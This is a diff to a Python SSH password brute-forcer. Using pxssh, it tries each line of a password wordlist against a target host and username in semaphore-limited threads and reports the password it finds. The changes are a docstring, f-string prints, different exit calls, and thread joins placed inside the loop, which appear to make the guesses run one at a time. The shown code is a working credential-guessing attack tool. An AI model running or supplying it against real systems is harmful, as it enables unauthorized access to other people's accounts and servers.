@@ -8,7 +8,6 @@ import argparse
 import time
 from threading import BoundedSemaphore
 from threading import Thread
-import sys
 
 maxConnections = 5
 connection_lock = BoundedSemaphore(value=maxConnections)
@@ -17,12 +16,20 @@ Fails = 0
 
 
 def connect(host, user, password, release):
+    ''' Wrapper for pxssh to connect to remote host via ssh
+
+    :param host: hostname of the target
+    :param user: username to attempt to authenticate as
+    :param password: Password to try to use to connect
+    :param release: Boolean flag
+    '''
+
     global Found
     global Fails
     try:
         s = pxssh.pxssh()
         s.login(host, user, password)
-        print("[+] Password Found: {}".format(password))
+        print(f"[+] Password Found: {password}")
         Found = True
     except Exception as e:
         if "read_nonblocking" in str(e):
@@ -71,19 +78,23 @@ def main():
     if host is None or passfile is None or user is None:
         parser.print_help()
 
+    threads = []
     with open(passfile, "r") as passList:
         for line in passList.readlines():
             if Found:
-                print("[+] Exiting: Password Found")
-                sys.exit()
+                print(f"[+] Exiting: Password Found")
+                exit(0)
             if Fails > 5:
-                print("[!] Exiting: Too many socket timeouts.")
-                sys.exit(1)
+                print(f"[!] Exiting: Too many socket timeouts.")
+                exit(1)
             connection_lock.acquire()
             password = line.strip("\r").strip("\n")
-            print("[-] Testing: {}".format(password))
+            print(f"[-] Testing: {password}")
             t = Thread(target=connect, args=(host, user, password, True))
-            child = t.start()
+            t.start()
+            threads.append(t)
+            for t in threads:
+                t.join()
 
 
 if __name__ == "__main__":
